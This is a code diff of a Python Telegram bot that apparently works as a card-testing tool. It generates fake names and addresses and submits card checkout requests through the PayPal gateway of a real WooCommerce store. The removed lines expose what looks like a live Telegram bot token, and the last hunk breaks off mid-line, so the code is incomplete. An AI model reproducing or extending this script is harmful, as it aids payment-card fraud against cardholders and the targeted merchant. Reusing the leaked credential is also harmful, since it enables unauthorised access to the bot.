@@ -1,6 +1,6 @@
 import logging
-from telegram import Update, ForceReply
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram import Update, ForceReply, Bot
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, Dispatcher, Updater
 import requests
 import re
 import time
@@ -8,8 +8,6 @@ import random
 import string
 import user_agent
 from requests_toolbelt.multipart.encoder import MultipartEncoder
-from telegram import Bot
-from telegram.ext import Updater, Dispatcher
 from flask import Flask, request
 
 # Enable logging
@@ -52,7 +50,7 @@ def webhook(bot: Bot) -> str:
     return 'OK'
 
 # Telegram Bot Token
-TELEGRAM_TOKEN = '8346877860:AAH5q53lv5kFvhQY1Qi-kg5zxhZFOe1QboY'
+TELEGRAM_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
 
 # Create an application instance
 app = Flask(__name__)
@@ -86,7 +84,7 @@ def generate_full_name():
                    "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
                    "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
                    "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
-    
+
     last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
                    "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
                    "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
@@ -95,13 +93,10 @@ def generate_full_name():
                    "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
                    "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
                    "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
-    
+
     full_name = random.choice(first_names) + " " + random.choice(last_names)
     first_name, last_name = full_name.split()
     return first_name, last_name
-
-# The rest of your code continues (card input, requests to switchupcb, etc.)
-
 
 def generate_address():
     cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
@@ -264,9 +259,4 @@ json_data = {
     'order_id': '0',
     'payment_method': 'ppcp-gateway',
     'funding_source': 'card',
-    'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num_val}&billing_email={acc}&account_username=&account_password=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fswitchupcb.com%2Fshop%2Fdrive-me-so-crazy%2F&wc_order_attribution_session_start_time=2024-03-15+10%3A00%3A46&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&g-recaptcha-response=&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
-    'createaccount': False,
-    'save_payment_method': False,
-}
-
-response = r.post('https://switchupcb.com/', params=params, cookies=r.cookies, headers=headers, data=data)
+    'form_encoded
